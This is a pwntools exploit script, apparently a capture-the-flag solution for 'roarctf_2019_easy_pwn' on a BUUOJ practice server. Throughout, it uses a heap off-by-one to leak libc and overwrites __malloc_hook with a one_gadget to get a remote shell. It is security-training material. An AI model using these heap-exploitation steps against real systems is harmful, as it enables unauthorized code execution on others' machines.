from pwn import *

libc = ELF('../../libc/1664')
elf = ELF('./roarctf_2019_easy_pwn')
context.arch = 'amd64'
r = remote('node3.buuoj.cn', 29243)


def malloc(size):
    r.recvuntil('choice: ')
    r.sendline('1')
    r.recvuntil('size: ')
    r.sendline(str(size))


def edit(index, size, content):
    r.recvuntil('choice: ')
    r.sendline('2')
    r.recvuntil('index: ')
    r.sendline(str(index))
    r.recvuntil('size: ')
    r.sendline(str(size))
    r.recvuntil('content: ')
    r.send(content)


def free(index):
    r.recvuntil('choice: ')
    r.sendline('3')
    r.recvuntil('index: ')
    r.sendline(str(index))


def show(index):
    r.recvuntil('choice: ')
    r.sendline('4')
    r.recvuntil('index: ')
    r.sendline(str(index))
    r.recvuntil('content: ')


def pwn(ogg, off):
    malloc(0x18)  # 0
    malloc(0x10)  # 1
    malloc(0x60)  # 2
    malloc(0x18)  # 3
    edit(0, 0x18 + 10, b'\x00' * 0x18 + p8(0x91))
    free(1)
    malloc(0x10)  # 1
    show(2)
    libc_base = u64(r.recv(6).ljust(8, b'\x00')) - 0x3C4B78
    malloc_hook_addr = libc_base + libc.sym['__malloc_hook'] - 0x23
    realloc_addr = libc_base + libc.sym['__libc_realloc'] + off
    one_gadget_addr = libc_base + ogg
    malloc(0x60)  # 4
    free(4)
    edit(2, 0x8, p64(malloc_hook_addr))
    malloc(0x60)  # 4
    malloc(0x60)  # 5
    edit(5, 0x1B, b'\x00' * 0xB + p64(one_gadget_addr) + p64(realloc_addr))
    malloc(0x10)
    r.sendline('id')
    ret = r.recv(3)
    if ret == b'uid':
        r.recvline()
        r.interactive()
        quit()


one_gadget_addr = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
realloc_offset = [0, 2, 4, 6, 8, 0xB, 0xC, 0xD]

for ogg in one_gadget_addr:
    for off in realloc_offset:
        try:
            pwn(ogg, off)
            r.close()
            r = remote('node3.buuoj.cn', 29243)
        except EOFError:
            r.close()
            r = remote('node3.buuoj.cn', 29243)
            continue
